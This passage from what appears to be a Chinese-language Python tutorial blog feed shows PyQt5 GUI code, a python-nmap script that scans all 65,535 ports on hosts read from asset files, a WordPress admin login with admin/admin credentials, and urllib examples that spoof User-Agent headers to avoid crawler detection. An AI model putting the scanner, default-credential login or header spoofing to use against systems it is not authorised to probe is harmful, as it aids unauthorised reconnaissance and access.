class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5 import QtWidgets,QtGui,QtCore</span><br><span class="line"></span><br><span class="line">class Main(QtWidgets.QWidget):</span><br><span class="line">    #创建一个窗口</span><br><span class="line">    def __init__(self, parent=None):</span><br><span class="line">        QtWidgets.QWidget.__init__(self,parent)</span><br><span class="line">        #在屏幕中心显示窗口</span><br><span class="line">        self.center()</span><br><span class="line">        #窗体布局</span><br><span class="line">        self.text()</span><br><span class="line"></span><br><span class="line">    #窗口显示在屏幕中心</span><br><span class="line">    def center(self):</span><br><span class="line">        self.setWindowTitle(&apos;笔记没了，不开心！&apos;)</span><br><span class="line">        #设置窗口的大小并固定</span><br><span class="line">        self.setFixedSize(650, 350)</span><br><span class="line">        #设置图标</span><br><span class="line">        self.setWindowIcon(QtGui.QIcon(&apos;favicon.ico&apos;))</span><br><span class="line"></span><br><span class="line">        #获取显示器的分辨率</span><br><span class="line">        screen = QtWidgets.QDesktopWidget().screenGeometry()</span><br><span class="line">        #获取窗体的宽高</span><br><span class="line">        size = self.geometry()</span><br><span class="line">        self.move((screen.width() - size.width())/2, (screen.height() - size.height())/2)</span><br><span class="line"></span><br><span class="line">    def text(self):</span><br><span class="line">        #新建两个按钮</span><br><span class="line">        sure = QtWidgets.QPushButton(&apos;确定&apos;,self)</span><br><span class="line">        cancel = QtWidgets.QPushButton(&apos;取消&apos;,self)</span><br><span class="line"></span><br><span class="line">        hbox = QtWidgets.QHBoxLayout()</span><br><span class="line">        #增加伸缩量,可以设置数值，留空为居中</span><br><span class="line">        hbox.addStretch()</span><br><span class="line">        hbox.addWidget(sure)</span><br><span class="line">        hbox.addStretch()</span><br><span class="line">        hbox.addWidget(cancel)</span><br><span class="line">        hbox.addStretch()</span><br><span class="line"></span><br><span class="line">        self.setLayout(hbox)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    GUI = QtWidgets.QApplication(sys.argv)</span><br><span class="line">    center = Main()</span><br><span class="line">    center.show()</span><br><span class="line">    sys.exit(GUI.exec_())</span><br></pre></td></tr></table></figure><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p>实现：打开文件夹并显示文件夹绝对路径、复选框、界面实时刷新（日志）、按钮事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtGui import QIcon</span><br><span class="line">from PyQt5 import QtCore, QtGui, QtWidgets</span><br><span class="line"></span><br><span class="line">class Ui_Form(object):</span><br><span class="line">    def setupUi(self, Form):</span><br><span class="line">        font = QtGui.QFont()</span><br><span class="line">        font.setFamily(&quot;宋体&quot;)</span><br><span class="line">        font.setPointSize(10)</span><br><span class="line">        Form.setFont(font)</span><br><span class="line">        #定义程序的标题</span><br><span class="line">        Form.setWindowTitle(&apos;RSAS漏洞数据导出工具1.5&apos;)</span><br><span class="line">        #设定程序的最大分辨率，禁止最大化、拖动窗口</span><br><span class="line">        Form.setFixedSize(520, 310)</span><br><span class="line">        #设置图标</span><br><span class="line">        Form.setWindowIcon(QIcon(&apos;favicon.ico&apos;))</span><br><span class="line">        #获取显示器的分辨率</span><br><span class="line">        screen = QtWidgets.QDesktopWidget().screenGeometry()</span><br><span class="line">        #获取程序的宽和高</span><br><span class="line">        size = Form.geometry()</span><br><span class="line">        #实现在屏幕中间显示程序</span><br><span class="line">        Form.move((screen.width() - size.width())/2, (screen.height() - size.height())/2)</span><br><span class="line"></span><br><span class="line">        #这是底部的状态栏</span><br><span class="line">        Form.status = Form.statusBar()</span><br><span class="line">        Form.status.showMessage(&quot;这是状态栏提示&quot;)</span><br><span class="line"></span><br><span class="line">        #这是一个框架，用来固定按钮用的</span><br><span class="line">        self.formLayoutWidget = QtWidgets.QWidget(Form)</span><br><span class="line">        self.formLayoutWidget.setGeometry(QtCore.QRect(10, 10, 411, 54))</span><br><span class="line">        self.formLayoutWidget.setObjectName(&quot;formLayoutWidget&quot;)</span><br><span class="line">        self.formLayout = QtWidgets.QFormLayout(self.formLayoutWidget)</span><br><span class="line">        self.formLayout.setContentsMargins(0, 0, 0, 0)</span><br><span class="line">        self.formLayout.setObjectName(&quot;formLayout&quot;)</span><br><span class="line">        #文字：原始报告路径</span><br><span class="line">        self.input_label = QtWidgets.QLabel(self.formLayoutWidget)</span><br><span class="line">        self.input_label.setObjectName(&quot;input_label&quot;)</span><br><span class="line">        self.formLayout.setWidget(0, QtWidgets.QFormLayout.LabelRole, self.input_label)</span><br><span class="line">        #文字：输出报告路径</span><br><span class="line">        self.output_label = QtWidgets.QLabel(self.formLayoutWidget)</span><br><span class="line">        self.output_label.setObjectName(&quot;output_label&quot;)</span><br><span class="line">        self.formLayout.setWidget(2, QtWidgets.QFormLayout.LabelRole, self.output_label)</span><br><span class="line">        #原始报告路径后边的文本框</span><br><span class="line">        self.input_lineEdit = QtWidgets.QLineEdit(self.formLayoutWidget)</span><br><span class="line">        self.input_lineEdit.setObjectName(&quot;input_lineEdit&quot;)</span><br><span class="line">        self.formLayout.setWidget(0, QtWidgets.QFormLayout.FieldRole, self.input_lineEdit)</span><br><span class="line">        #输出报告路径后边的文本框</span><br><span class="line">        self.output_lineEdit = QtWidgets.QLineEdit(self.formLayoutWidget)</span><br><span class="line">        self.output_lineEdit.setObjectName(&quot;output_lineEdit&quot;)</span><br><span class="line">        self.formLayout.setWidget(2, QtWidgets.QFormLayout.FieldRole, self.output_lineEdit)</span><br><span class="line">        #框架的结束部分</span><br><span class="line">        spacerItem = QtWidgets.QSpacerItem(20, 40, QtWidgets.QSizePolicy.Minimum, QtWidgets.QSizePolicy.Expanding)</span><br><span class="line">        self.formLayout.setItem(1, QtWidgets.QFormLayout.LabelRole, spacerItem)</span><br><span class="line">        #这玩意就是打开路径按钮的框架</span><br><span class="line">        self.start_verticalLayoutWidget = QtWidgets.QWidget(Form)</span><br><span class="line">        self.start_verticalLayoutWidget.setGeometry(QtCore.QRect(423, 2, 91, 71))</span><br><span class="line">        self.start_verticalLayoutWidget.setObjectName(&quot;start_verticalLayoutWidget&quot;)</span><br><span class="line">        self.start_verticalLayout = QtWidgets.QVBoxLayout(self.start_verticalLayoutWidget)</span><br><span class="line">        self.start_verticalLayout.setContentsMargins(0, 0, 0, 0)</span><br><span class="line">        self.start_verticalLayout.setObjectName(&quot;start_verticalLayout&quot;)</span><br><span class="line">        #这是原始报告路径后边的文本框后边的打开路径按钮</span><br><span class="line">        self.input_Button = QtWidgets.QPushButton(self.start_verticalLayoutWidget)</span><br><span class="line">        self.input_Button.setObjectName(&quot;input_Button&quot;)</span><br><span class="line">        self.start_verticalLayout.addWidget(self.input_Button)</span><br><span class="line">        self.input_Button.clicked.connect(self.input_Button_click)</span><br><span class="line">        #这是输出报告路径后边的文本框后边的打开路径按钮</span><br><span class="line">        self.output_Button = QtWidgets.QPushButton(self.start_verticalLayoutWidget)</span><br><span class="line">        self.output_Button.setObjectName(&quot;output_Button&quot;)</span><br><span class="line">        self.start_verticalLayout.addWidget(self.output_Button)</span><br><span class="line">        self.output_Button.clicked.connect(self.output_Button_click)</span><br><span class="line">        #这又是一个框架，固定用的</span><br><span class="line">        self.horizontalLayoutWidget = QtWidgets.QWidget(Form)</span><br><span class="line">        self.horizontalLayoutWidget.setGeometry(QtCore.QRect(10, 75, 411, 21))</span><br><span class="line">        self.horizontalLayoutWidget.setObjectName(&quot;horizontalLayoutWidget&quot;)</span><br><span class="line">        self.horizontalLayout = QtWidgets.QHBoxLayout(self.horizontalLayoutWidget)</span><br><span class="line">        self.horizontalLayout.setContentsMargins(0, 0, 0, 0)</span><br><span class="line">        self.horizontalLayout.setObjectName(&quot;horizontalLayout&quot;)</span><br><span class="line">        #文字：选择导出数据</span><br><span class="line">        self.data_label = QtWidgets.QLabel(self.horizontalLayoutWidget)</span><br><span class="line">        self.data_label.setObjectName(&quot;data_label&quot;)</span><br><span class="line">        self.horizontalLayout.addWidget(self.data_label)</span><br><span class="line">        #复选框：高危</span><br><span class="line">        self.hight_checkBox = QtWidgets.QCheckBox(self.horizontalLayoutWidget)</span><br><span class="line">        self.hight_checkBox.setObjectName(&quot;hight_checkBox&quot;)</span><br><span class="line">        self.hight_checkBox.setChecked(True)</span><br><span class="line">        self.horizontalLayout.addWidget(self.hight_checkBox)</span><br><span class="line">        #复选框：中危</span><br><span class="line">        self.middle_checkBox = QtWidgets.QCheckBox(self.horizontalLayoutWidget)</span><br><span class="line">        self.middle_checkBox.setObjectName(&quot;middle_checkBox&quot;)</span><br><span class="line">        self.middle_checkBox.setChecked(True)</span><br><span class="line">        self.horizontalLayout.addWidget(self.middle_checkBox)</span><br><span class="line">        #复选框：低危</span><br><span class="line">        self.low_checkBox = QtWidgets.QCheckBox(self.horizontalLayoutWidget)</span><br><span class="line">        self.low_checkBox.setObjectName(&quot;low_checkBox&quot;)</span><br><span class="line">        self.horizontalLayout.addWidget(self.low_checkBox)</span><br><span class="line">        #复选框：端口</span><br><span class="line">        self.port_checkBox = QtWidgets.QCheckBox(self.horizontalLayoutWidget)</span><br><span class="line">        self.port_checkBox.setObjectName(&quot;port_checkBox&quot;)</span><br><span class="line">        self.horizontalLayout.addWidget(self.port_checkBox)</span><br><span class="line">        #复选框：网站</span><br><span class="line">        self.web_checkBox = QtWidgets.QCheckBox(self.horizontalLayoutWidget)</span><br><span class="line">        self.web_checkBox.setObjectName(&quot;web_checkBox&quot;)</span><br><span class="line">        self.horizontalLayout.addWidget(self.web_checkBox)</span><br><span class="line">        #这又是一个框架</span><br><span class="line">        self.end_verticalLayoutWidget = QtWidgets.QWidget(Form)</span><br><span class="line">        self.end_verticalLayoutWidget.setGeometry(QtCore.QRect(423, 69, 91, 31))</span><br><span class="line">        self.end_verticalLayoutWidget.setObjectName(&quot;end_verticalLayoutWidget&quot;)</span><br><span class="line">        self.end_verticalLayout = QtWidgets.QVBoxLayout(self.end_verticalLayoutWidget)</span><br><span class="line">        self.end_verticalLayout.setContentsMargins(0, 0, 0, 0)</span><br><span class="line">        self.end_verticalLayout.setObjectName(&quot;end_verticalLayout&quot;)</span><br><span class="line">        #按钮：开始导出</span><br><span class="line">        self.start_Button = QtWidgets.QPushButton(self.end_verticalLayoutWidget)</span><br><span class="line">        self.start_Button.setObjectName(&quot;start_Button&quot;)</span><br><span class="line">        self.start_Button.clicked.connect(self.start_Button_click)</span><br><span class="line">        #框架结尾</span><br><span class="line">        self.end_verticalLayout.addWidget(self.start_Button)</span><br><span class="line">        #文字：详细输出日志</span><br><span class="line">        self.log_label = QtWidgets.QLabel(Form)</span><br><span class="line">        self.log_label.setGeometry(QtCore.QRect(10, 101, 91, 21))</span><br><span class="line">        self.log_label.setObjectName(&quot;log_label&quot;)</span><br><span class="line">        #详细输出日志的文本框</span><br><span class="line">        self.log_textEdit = QtWidgets.QTextEdit(Form)</span><br><span class="line">        self.log_textEdit.setGeometry(QtCore.QRect(10, 120, 501, 171))</span><br><span class="line">        self.log_textEdit.setObjectName(&quot;log_textEdit&quot;)</span><br><span class="line"></span><br><span class="line">        self.retranslateUi(Form)</span><br><span class="line">        QtCore.QMetaObject.connectSlotsByName(Form)</span><br><span class="line"></span><br><span class="line">    def retranslateUi(self, Form):</span><br><span class="line">        _translate = QtCore.QCoreApplication.translate</span><br><span class="line">        self.input_label.setText(_translate(&quot;Form&quot;, &quot;原始报告路径：&quot;))</span><br><span class="line">        self.output_label.setText(_translate(&quot;Form&quot;, &quot;输出报告路径：&quot;))</span><br><span class="line">        self.input_Button.setText(_translate(&quot;Form&quot;, &quot;打开路径&quot;))</span><br><span class="line">        self.output_Button.setText(_translate(&quot;Form&quot;, &quot;打开路径&quot;))</span><br><span class="line">        self.data_label.setText(_translate(&quot;Form&quot;, &quot;选择导出数据：&quot;))</span><br><span class="line">        self.hight_checkBox.setText(_translate(&quot;Form&quot;, &quot;高危&quot;))</span><br><span class="line">        self.middle_checkBox.setText(_translate(&quot;Form&quot;, &quot;中危&quot;))</span><br><span class="line">        self.low_checkBox.setText(_translate(&quot;Form&quot;, &quot;低危&quot;))</span><br><span class="line">        self.port_checkBox.setText(_translate(&quot;Form&quot;, &quot;端口&quot;))</span><br><span class="line">        self.web_checkBox.setText(_translate(&quot;Form&quot;, &quot;网站&quot;))</span><br><span class="line">        self.start_Button.setText(_translate(&quot;Form&quot;, &quot;开始导出&quot;))</span><br><span class="line">        self.log_label.setText(_translate(&quot;Form&quot;, &quot;详细输出日志：&quot;))</span><br><span class="line"></span><br><span class="line">    #原始报告路径的按钮</span><br><span class="line">    def input_Button_click(self):</span><br><span class="line">        self.input_Button_cent = QtWidgets.QFileDialog.getExistingDirectory(MainWindow)</span><br><span class="line">        self.input_lineEdit.setText(self.input_Button_cent)</span><br><span class="line">    </span><br><span class="line">    #输出报告路径的按钮</span><br><span class="line">    def output_Button_click(self):</span><br><span class="line">        self.output_Button_cent = QtWidgets.QFileDialog.getExistingDirectory(MainWindow)</span><br><span class="line">        self.output_lineEdit.setText(self.output_Button_cent)</span><br><span class="line"></span><br><span class="line">    #输出报告路径的按钮</span><br><span class="line">    def start_Button_click(self):</span><br><span class="line">        self.hight_status = self.hight_checkBox.isChecked()</span><br><span class="line">        self.middle_status = self.middle_checkBox.isChecked()</span><br><span class="line">        self.low_status = self.low_checkBox.isChecked()</span><br><span class="line">        self.port_status = self.port_checkBox.isChecked()</span><br><span class="line">        self.web_status = self.web_checkBox.isChecked()</span><br><span class="line">        print(&apos;高危：%s 中危：%s 低危：%s 端口：%s 网站：%s&apos; % (self.hight_status,self.middle_status,self.low_status,self.port_status,self.web_status))</span><br><span class="line">        for log in range(10000): </span><br><span class="line">            str_log=&apos;日志： &#123;0&#125;&apos;.format(log)</span><br><span class="line">            self.log_textEdit.moveCursor(QtGui.QTextCursor.End)</span><br><span class="line">            self.log_textEdit.insertPlainText(str_log + &apos;\n&apos;)</span><br><span class="line">            QtWidgets.QApplication.processEvents()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app = QtWidgets.QApplication(sys.argv)</span><br><span class="line">    MainWindow = QtWidgets.QMainWindow()</span><br><span class="line">    ui = Ui_Form()</span><br><span class="line">    ui.setupUi(MainWindow)</span><br><span class="line">    MainWindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python nmap</title>
      <link href="/article/python-nmap.html"/>
      <url>/article/python-nmap.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import nmap</span><br><span class="line"></span><br><span class="line">class NmapScan(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(NmapScan, self).__init__()</span><br><span class="line">        self.path = &apos;./assets/&apos;</span><br><span class="line">        self.command = &apos;-p 1-65535&apos;</span><br><span class="line"></span><br><span class="line">    def assets(self):</span><br><span class="line">        return [self.path,os.listdir(self.path)]</span><br><span class="line"></span><br><span class="line">    def scan(self,host):</span><br><span class="line">        nm.scan(host,arguments=self.command)</span><br><span class="line">        try:</span><br><span class="line">            nm[host].state() == &apos;up&apos;</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&apos;IP：&#123;:&lt;20&#125;禁PING或不存活！&apos;.format(host))</span><br><span class="line">        else:</span><br><span class="line">            if len(nm[host].all_tcp()) &gt;= 65535/2:</span><br><span class="line">               print(&apos;IP：&#123;:&lt;20&#125;返回全端口，已加入超线程WEB探测！&apos;.format(host))</span><br><span class="line">            else:</span><br><span class="line">                for port in nm[host].all_tcp():</span><br><span class="line">                    print(&apos;IP：&#123;:&lt;20&#125;端口：&#123;:&lt;10&#125;状态：&#123;:&lt;10&#125;服务：&#123;&#125;&apos;.format(host,port,nm[host].tcp(port)[&apos;state&apos;],nm[host].tcp(port)[&apos;name&apos;]))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    nm = nmap.PortScanner()</span><br><span class="line">    nmap = NmapScan()</span><br><span class="line">    path = nmap.assets()[0]</span><br><span class="line">    listing = nmap.assets()[1]</span><br><span class="line">    for lists in listing:</span><br><span class="line">        with open(path + lists) as cent:</span><br><span class="line">            for host in cent:</span><br><span class="line">                host = host.strip(&apos;\n\r&apos;)</span><br><span class="line">                nmap.scan(host)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 127.0.0.1 80 open http Apache httpd 2.2.17 (Win32) PHP/5.3.5</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python requests</title>
      <link href="/article/python-requests.html"/>
      <url>/article/python-requests.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import html</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_login(url,data):</span><br><span class="line">    Session = requests.Session()</span><br><span class="line">    Session.post(url,data = data)</span><br><span class="line">    return Session</span><br><span class="line"></span><br><span class="line">def get_title(content):</span><br><span class="line">    return re.findall(&apos;&lt;title&gt;(.*?)&lt;/title&gt;&apos;,content,re.S|re.M)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    url = &apos;https://test.webing.io/wp-login.php&apos;</span><br><span class="line">    data = &#123;</span><br><span class="line">    &apos;log&apos;:&apos;admin&apos;,</span><br><span class="line">    &apos;pwd&apos;:&apos;admin&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    login = get_login(url,data)</span><br><span class="line">    admin = login.get(&apos;https://test.webing.io/wp-admin/&apos;)</span><br><span class="line">    title = get_title(admin.text)</span><br><span class="line">    print(html.unescape(title[0]))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python urllib.request</title>
      <link href="/article/python-urllib-request.html"/>
      <url>/article/python-urllib-request.html</url>
      
        <content type="html"><![CDATA[<h3 id="打开一个网页"><a href="#打开一个网页" class="headerlink" title="打开一个网页"></a>打开一个网页</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from urllib.request import urlopen</span><br><span class="line"></span><br><span class="line">url = &apos;https://anywheres.coding.me/webing&apos;</span><br><span class="line">response = urlopen(url)</span><br><span class="line"></span><br><span class="line">with response:</span><br><span class="line">    # 查看response的类型</span><br><span class="line">    print(type(response))</span><br><span class="line">    # 查看打开网页的状态吗</span><br><span class="line">    print(response.status)</span><br><span class="line">    # 获取访问网页后返回的链接，用于301 302跳转</span><br><span class="line">    print(response.geturl())</span><br><span class="line"></span><br><span class="line">print(response.closed)</span><br></pre></td></tr></table></figure><h3 id="发送请求-urllib-request"><a href="#发送请求-urllib-request" class="headerlink" title="发送请求 urllib.request"></a>发送请求 urllib.request</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">url = &apos;https://webing.io&apos;</span><br><span class="line"></span><br><span class="line">#自定义head头部，因为默认的情况下，headers为Python-urllib/3.6，服务器会直接判断为爬虫</span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;User-Agent&apos;:&apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#构建一个请求对象</span><br><span class="line">request = urllib.request.Request(url,headers=headers)</span><br><span class="line">#向指定的url地址发送请求，并返回服务器响应的类文件对象</span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">#读取返回文件对象的全部内容，并进行解码</span><br><span class="line">html = response.read().decode(&apos;utf8&apos;)</span><br><span class="line">#输出响应的内容</span><br><span class="line">print(html)</span><br><span class="line"></span><br><span class="line">#读取返回文件对象的响应码</span><br><span class="line">code = response.getcode()</span><br><span class="line">#输出响应码</span><br><span class="line">print(code)</span><br><span class="line"></span><br><span class="line">#返回发送请求之后的URL，如发送请求之后跳转到了其他页面的链接</span><br><span class="line">url = response.geturl()</span><br><span class="line">#输出URL</span><br><span class="line">print(url)</span><br><span class="line"></span><br><span class="line">#返回服务器响应的HTTP报头</span><br><span class="line">url = response.info()</span><br><span class="line">#输出报头</span><br><span class="line">print(url)</span><br><span class="line"></span><br><span class="line">#查看这个对象的方法</span><br><span class="line">print(dir(response))</span><br></pre></td></tr></table></figure><h3 id="浏览器识别-User-Agent"><a href="#浏览器识别-User-Agent" class="headerlink" title="浏览器识别 User-Agent"></a>浏览器识别 User-Agent</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">url = &apos;https://webing.io&apos;</span><br><span class="line"></span><br><span class="line">#可以是User-Agent列表，也可以是代理列表</span><br><span class="line">User_list = [</span><br><span class="line">    &apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&apos;,</span><br><span class="line">    &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">#在User_list列表里边随机选择一个User-Agent</span><br><span class="line">User_Agent = random.choice(User_list)</span><br><span class="line"></span><br><span class="line">#构建一个请求对象</span><br><span class="line">request = urllib.request.Request(url)</span><br><span class="line">#使用add_header()方法，添加一个HTTP报头</span><br><span class="line">request.add_header(&apos;User-Agent&apos;,User_Agent)</span><br><span class="line"></span><br><span class="line">#向指定的url地址发送请求，并返回服务器响应的类文件对象</span><br><span class="line">response = urllib.request.urlopen(request)</span><br></pre></td></tr></table></figure><h3 id="url转码-urllib-parse-urlencode"><a href="#url转码-urllib-parse-urlencode" class="headerlink" title="url转码 urllib.parse.urlencode"></a>url转码 urllib.parse.urlencode</h3><figure 